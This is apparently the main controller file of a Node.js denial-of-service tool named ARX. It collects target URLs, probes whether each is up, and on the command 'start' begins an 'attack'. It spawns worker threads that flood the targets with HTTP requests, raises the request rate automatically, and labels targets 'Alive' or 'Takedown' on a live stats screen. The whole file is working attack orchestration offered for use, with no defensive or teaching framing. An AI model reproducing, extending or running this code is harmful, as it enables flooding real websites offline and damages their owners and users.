// main.js

const readline = require('readline');
const { Worker } = require('worker_threads');
const os = require('os');
const chalk = require('chalk');
const http = require('http');
const https = require('https');
const cliBoxes = require('cli-boxes');

console.clear();
console.log(chalk.greenBright.bold('Selamat datang di ARX - Advanced Request eXecutor [AutoScale]'));

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
readline.emitKeypressEvents(process.stdin);
if (process.stdin.isTTY) process.stdin.setRawMode(true);

let targets = [], workers = [], stats = {}, statuses = {}, started = false, config = {};

function askURL(index = 0) {
  rl.question(`Target URL #${index + 1} (leave blank to finish): `, async url => {
    if (!url.trim()) {
      if (targets.length === 0) return askURL(index);
      return askCommand();
    }
    const isLive = await testTarget(url.trim());
    targets.push(url.trim());
    statuses[url.trim()] = isLive ? 'Alive' : 'Takedown';
    stats[url.trim()] = { sent: 0, success: 0, failed: 0, threads: 1, rps: 10 };
    askURL(index + 1);
  });
}

function askCommand() {
  rl.question('Type "start" to begin attack: ', (input) => {
    if (input.trim().toLowerCase() === 'start') {
      console.clear();
      console.log(chalk.redBright('╔' + '═'.repeat(78) + '╗'));
      console.log(chalk.redBright('║') + chalk.yellowBright.bold('  ARX - Advanced Request eXecutor  ') + chalk.white('by: Akashirohman and team'.padStart(52)) + chalk.redBright('║'));
      console.log(chalk.redBright('╚' + '═'.repeat(78) + '╝'));
      startAttack();
    } else {
      askCommand();
    }
  });
}

function testTarget(url) {
  return new Promise(resolve => {
    const lib = url.startsWith('https') ? https : http;
    const req = lib.get(url, { timeout: 5000 }, res => {
      res.resume();
      resolve(true);
    });
    req.on('error', () => resolve(false));
    req.on('timeout', () => {
      req.destroy();
      resolve(false);
    });
  });
}

function startAttack() {
  started = true;
  targets.forEach((url, i) => {
    const baseRps = 10;
    const baseThreads = 1;
    stats[url].rps = baseRps;
    stats[url].threads = baseThreads;

    for (let j = 0; j < baseThreads; j++) {
      launchWorker(url, baseRps);
    }
  });
  displayStats();
  listenCommand();
}

function launchWorker(url, rps) {
  const worker = new Worker('./worker.js', { workerData: { target: url, rps } });

  worker.on('message', (msg) => {
    if (msg.type === 'stats') {
      stats[url].sent += msg.sent;
      stats[url].success += msg.success;
      stats[url].failed += msg.failed;

      const total = msg.sent;
      const failRate = msg.failed / (total || 1);

      if (failRate > 0.5) {
        stats[url].rps = Math.max(1, stats[url].rps - 1);
      } else if (msg.success > msg.failed) {
        stats[url].rps++;
      }

      worker.postMessage({ type: 'updateRPS', rps: stats[url].rps });
    }
    if (msg.type === 'error') {
      launchWorker(url, stats[url].rps);
    }
  });

  worker.on('error', () => launchWorker(url, stats[url].rps));
  workers.push(worker);
}

function displayStats() {
  setInterval(() => {
    readline.cursorTo(process.stdout, 0, 3);
    targets.forEach((url, i) => {
      const s = stats[url];
      const status = statuses[url] === 'Alive' ? chalk.greenBright('🟢 Alive') : chalk.redBright('🔴 Takedown');
      readline.clearLine(process.stdout, 0);
      process.stdout.write(
        `${chalk.redBright('[STATS #' + (i + 1) + ']')} ${chalk.yellow('Sent')}: ${s.sent} ` +
        `| ${chalk.green('Success')}: ${s.success} ` +
        `| ${chalk.red('Failed')}: ${s.failed} ` +
        `| ${chalk.blue('Threads')}: ${s.threads} ` +
        `| ${chalk.cyan('RPS')}: ${s.rps} ` +
        `| ${chalk.magenta('Target')}: ${url} ` +
        `| ${status}
`
      );
    });
    readline.moveCursor(process.stdout, 0, 1);
    readline.clearLine(process.stdout, 0);
    process.stdout.write('Command (stop): ');
  }, 1000);
}

function listenCommand() {
  rl.on('line', line => {
    if (line.trim().toLowerCase() === 'stop') {
      workers.forEach(w => w.terminate());
      console.log(chalk.redBright('\n[STOPPED] All targets stopped.'));
      process.exit(0);
    }
  });
}

askURL();
